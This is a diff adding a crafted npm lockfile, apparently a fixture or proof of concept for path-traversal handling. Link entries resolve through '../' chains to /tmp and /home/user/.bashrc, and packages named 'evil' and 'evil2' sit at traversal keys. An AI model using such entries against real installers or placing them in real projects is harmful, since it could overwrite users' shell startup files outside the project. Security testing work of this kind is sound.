@@ -1,0 +1,31 @@
+{
+  "name": "tar_git",
+  "version": "2.11.1",
+  "lockfileVersion": 3,
+  "packages": {
+    "": {
+      "name": "tar_git",
+      "version": "2.9.5"
+    },
+    "../../node_modules/test/": {
+      "link": true,
+      "resolved": "../../../../../../../tmp"
+    },
+    "../../node_modules/.package-lock.json": {
+      "link": true,
+      "resolved": "../../../../../../../home/user/.bashrc"
+    },
+    "../../../../../../../tmp": {
+      "name": "evil",
+      "version": "1.0.0"
+    },
+    "../../../../../.bashrc": {
+      "name": "evil2",
+      "version": "1.0.0"
+    },
+    "../gitcontent": {
+      "version": "1.0.0",
+      "resolved": "github:yosiroute/npm_pkg"
+    }
+  }
+}
